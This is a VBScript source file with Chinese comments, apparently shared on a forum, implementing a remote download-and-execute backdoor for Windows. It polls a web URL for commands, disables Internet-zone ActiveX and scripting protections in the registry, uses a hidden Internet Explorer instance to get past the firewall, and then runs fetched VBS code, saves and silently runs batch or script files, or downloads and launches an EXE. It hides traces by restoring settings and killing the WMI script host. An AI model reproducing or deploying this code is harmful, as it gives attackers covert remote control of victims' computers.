cmdu="http://myweb.8866.org/cmd.txt"      '从web服务器获取命令的url'
cmdw=4000                                 '下载超时时间4秒'
cmdl="HKLM\SOFTWARE\Microsoft\WBEM\CIMOM\CmdLength"   '记录命令长度的键值名'

'on error resume next                      '忽略非致命错误  '（调试时注释掉本行）
set shl=createobject("WScript.Shell")     '虽然不能使用WScript根对象，其子对象还是可以用的'
set aso=createobject("ADODB.Stream")
set ie=createobject("InternetExplorer.Application")   '使用ie绕过防火墙'

zone="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3"
set1=zone&"\1201"
set2=zone&"\1400"
set3=zone&"\CurrentLevel"
val1=shl.regread(set1)                    '保存原来的安全设置'
val2=shl.regread(set2)
val3=shl.regread(set3)
regd="REG_DWORD"
shl.regwrite set1,0,regd                  '允许在Internet域运行不安全的ActiveX'
shl.regwrite set2,0,regd                  '允许活动脚本'
shl.regwrite set3,0,regd                  '设置当前Internet域安全级别为“自定义”'

ie.visible=0                              :ie.visible=1  '（调试用）
ie.navigate "about"&":blank"              '这里使用字符串连接纯属反论坛过滤'
ie.document.write _
"<script>function whr(){return new ActiveXObject('WinHttp.WinHttpRequest.5.1')}</script>"
set whr=ie.document.script.whr()          '在ie内创建WinHttpRequest对象'

whr.settimeouts cmdw,cmdw,cmdw,cmdw       '设置域名解析、连接、发送和接收超时时间'
whr.open "GET",cmdu,true                  '获取命令文件'
whr.send
if not whr.waitforresponse(cmdw) then die
if whr.status>299 then die
rt=whr.responsetext                       :wscript.echo rt  '（调试用）
                                          :shl.regwrite cmdl,0,regd  '（调试用）
if len(rt)=shl.regread(cmdl) then die     '与前一个命令的长度比较'
shl.regwrite cmdl,len(rt),regd            '更新命令长度'
cmds=split(rt,vbcrlf,-1)
if ubound(cmds)<1 then die
cmdt=lcase(trim(cmds(0)))                 :wscript.echo cmdt  '（调试用）

aso.type=1
aso.open
cd=shl.currentdirectory&chr(92)
select case cmdt                          '分析命令文件类型'
   case "'vbs"                            '是vbs'
      execute(rt)                         '直接在当前脚本上下文中执行'
      die
   case ":bat"                            '是批处理'
      aso.write whr.responsebody
      aso.savetofile cd&"_.bat",2         '保存在当前目录'
      aso.close
      shl.run chr(34)&cd&"_.bat""",0      '运行批处理'
      die
   case "'wsh"                            '是Windows脚本'
      aso.write whr.responsebody
      aso.savetofile cd&"_.vbs",2         '保存在当前目录'
      aso.close
      shl.run "cscript.exe """&cd&"_.vbs""",0 '使用cscript作为脚本宿主'
      die
   case "exe"                             'exe需进一步分析'
   case else die
end select

if ubound(cmds)<4 then die                :wscript.echo cmds(1)  '（调试用）
whr.open "GET",cmds(1),true               '从指定位置下载exe文件'
whr.send
if not whr.waitforresponse(cmds(2)) then die
if whr.status>299 then die
path=shl.expandenvironmentstrings(cmds(3))'展开保存路径中的环境变量'
aso.write whr.responsebody                :wscript.echo path  '（调试用）
aso.savetofile path,2                     '保存exe文件'
aso.close
shl.run chr(34)&path&""" "&cmds(4),0      '执行exe'

die

sub die
   ie.quit
   shl.regwrite set1,val1,regd            '还原Internet域安全设置'
   shl.regwrite set2,val2,regd
   shl.regwrite set3,val3,regd
   for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_
      if lcase(ps.name)="scrcons.exe" then ps.terminate   '自杀'
   next
   wscript.echo "die": wscript.quit  '（调试用）
end sub